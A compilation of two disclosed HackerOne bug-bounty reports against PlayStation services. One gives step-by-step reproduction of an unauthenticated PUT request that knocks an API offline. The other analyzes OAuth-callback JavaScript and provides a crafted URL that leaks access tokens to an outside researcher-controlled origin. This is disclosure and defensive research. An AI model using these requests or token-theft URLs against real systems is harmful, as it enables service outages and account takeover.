# Missing Authorization

_2 reports — High/Critical, disclosed_

### [Unrestricted access to quiesce functionality in dss.api.playstation.com REST API leads to unavailability of application](https://hackerone.com/reports/993722)

- **Report ID:** `993722`
- **Severity:** High
- **Weakness:** Missing Authorization
- **Program:** PlayStation
- **Reporter:** @wiiiiam
- **Bounty:** 1000 usd
- **Disclosed:** 2021-03-30T04:22:00.184Z
- **CVE(s):** -

**Summary (team):**

## Report Summary
----
Unrestricted access to the quiesce function via a `PUT` request to `https://dss.api.playstation.com/api/application/state` makes the application unreachable for an uncertain amount of time.

## Steps To Reproduce
----
[Reproduction method #1]
+ *Burp Suite is the program required for the following method of reproduction*
+ *Any OS platform can be used to reproduce this bug*
  
1. Using Burp Suite, go to *Proxy* tab -> *Intercept* tab. On this pane, click on **Open Browser** to launch the embedded chromium browser. {F1006879}
1. In the chromium browser address bar, enter: https://dss.api.playstation.com/api/application/state
1. In Burp Suite, go to *Proxy* tab -> *HTTP history* and in this window pane, click on the request so that it is highlighted and press keys: `CTRL+R` 
{F1006881}
1. Click on the tab *Repeater* in Burp Suite and in the left pane labeled *Request*, omit the word GET and type PUT so that the first line now looks like this: 
`PUT /api/application/state HTTP/1.1`
1. Click on the first of the last two empty lines in the request and type: `Content-Type: application/json`. On the last of the empty lines type: `Content-Length: ` with a space at the end and leave this value to be filled by Burp Suite. Press ENTER twice so that two empty lines remain.
1. On the last empty line of the pair type the following JSON name/value pair: `{"appState":"quiesce"}`
1. The request should appear like this: {F1006882} Click **Send**.

Within as low as 15 seconds, on refresh or on visitation to another path of the application e.g. https://dss.api.playstation.com/api/application.wadl , the application should return a 502 Bad Gateway error response.

----
[Reproduction method #2]
+ *Firefox browser is the program required for the following method of reproduction*
+ *Any OS platform can be used to reproduce this bug*

1. In the Firefox browser address bar, enter: https://dss.api.playstation.com/api/application/state
1. Once the page has loaded, press the key combination: `CTRL+SHIFT+E` to access the *Network* tool and click on the button labeled *Reload*.
1. Once the Network view is populated with the GET request the browser sent, click on its entry so that it is highlighted and right-click to open a context menu and click on *Edit and Resend*.


4. In *New Request* editor that opened on the right end of the Network window, perform the following edits:
  * In the box labeled **Method** change GET to PUT
  * at the end of the **Request Headers** box, add the following lines: `Content-Type: application/json` and `Content-Length: 22`
  * In the box labeled **Request Body** box enter: `{"appState":"quiesce"}`
5. The request should look like this: {F1006899} Click **Send**.

Within as low as 15 seconds, on refresh or on visitation to another path of the application e.g. https://dss.api.playstation.com/api/application.wadl , the application should return a 502 Bad Gateway error response.
+-+-+
## Supporting Material/References
----
  * Burp-Step1.png, Burp-Step2.png, Burp-Step3.png
  * Firefox-Step1.png, Firefox-Step2.png, Firefox-Step3.png
  * impact.png

## Impact

No authorization for `/api/application/state` allows an attacker to disrupt the availability of the application in a sustained manner for an undisclosed amount of time through multiple PUT requests for quiescence. This affected host was unavailable for over an hour at the start of today starting at around 10:40 AM CDT UTC-5 and persisting past 11:45 CDT UTC-5 the last time I performed the request. 

[7:07 PM UTC-5] I tested Reproduction method #2 and 502 response was received.

---

### [Access token stealing.](https://hackerone.com/reports/821896)

- **Report ID:** `821896`
- **Severity:** High
- **Weakness:** Missing Authorization
- **Program:** PlayStation
- **Reporter:** @bugdiscloseguys
- **Bounty:** 1200 usd
- **Disclosed:** 2020-11-21T00:36:00.518Z
- **CVE(s):** -

**Summary (team):**

# Summary:
`https://my.playstation.com/auth/response.html` suffers from a misconfiguration which leads to access token stealing.

# Description:
The page `https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&baseUrl=/&targetOrigin=https://my.playstation.com` hosts a javascript which is responsible for transferring OAuth access token from the issuing server to the client.

On analyzing this javascript we found an issue which leads to an access token stealing.

```
    function parseResponse(a) {
    var b = a.hash.substr(1),
        c = a.search.substr(1),
        d = b + "&" + c,
        e = convertToObject(d);
    return e.refererURL = a.toString(), e
}

....
....
....
function sendResponseToApp(a) {
    var b = extractFrameTypeFromRequestID(a.requestID),
        c = a.targetOrigin || getOrigin(),
        d = a.baseUrl || "",
        e = a.returnRoute || "",
        f = a.excludeQueryParams,
        g = !f && window.location.search || "";
    switch (b) {
        case "iframe":
            window.parent.postMessage(a, c);
            break;
        case "window":
            window.opener.postMessage(a, c);
            break;
        case "external":
        default:
            var h = constructUrl(c, d, e) + g;
            /^(https:\/\/)([a-z0-9\-]+\.)+(playstation\.com)(:([0-9]){4})?\//.test(h) ?
             window.location.href = h : window.location.href = "https://playstation.com/error"
    }
}


var response = parseResponse(window.location);
sendResponseToApp(response);
```

```
var b = extractFrameTypeFromRequestID(a.requestID),
...
switch (b)
  case "window":
            window.opener.postMessage(a, c);
            break;
```

To get into the window case we need to start the requestID parameter value from `window` keyword.
a => window.location
c => a.targetOrigin which is the query parameter `targetOrigin` extracted using the function parseResponse.
a,c are passed to window.opener.postMessage() which takes the first argument as the message itself and second as the origin where to send the message.

Our payload URL will become something like this: https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&baseUrl=/&targetOrigin=https://rce.ee/

We pass this payload URL to the OAuth issuing server: https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3a//my.playstation.com/auth/response.html%3frequestID%3dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%26baseUrl%3d/%26targetOrigin%3dhttps%3a//rce.ee/&prompt=none

Here's the final PoC : https://rce.ee/psoauthbypass1007.html

# Steps to reproduce:
Open https://playstation.com/
Login with your account
Open and click! https://rce.ee/psoauthbypass1007.html

# Impact
Access token stealing/account takeover.

**Summary (researcher):**

This was found In collaboration with @iamnoooob.

---
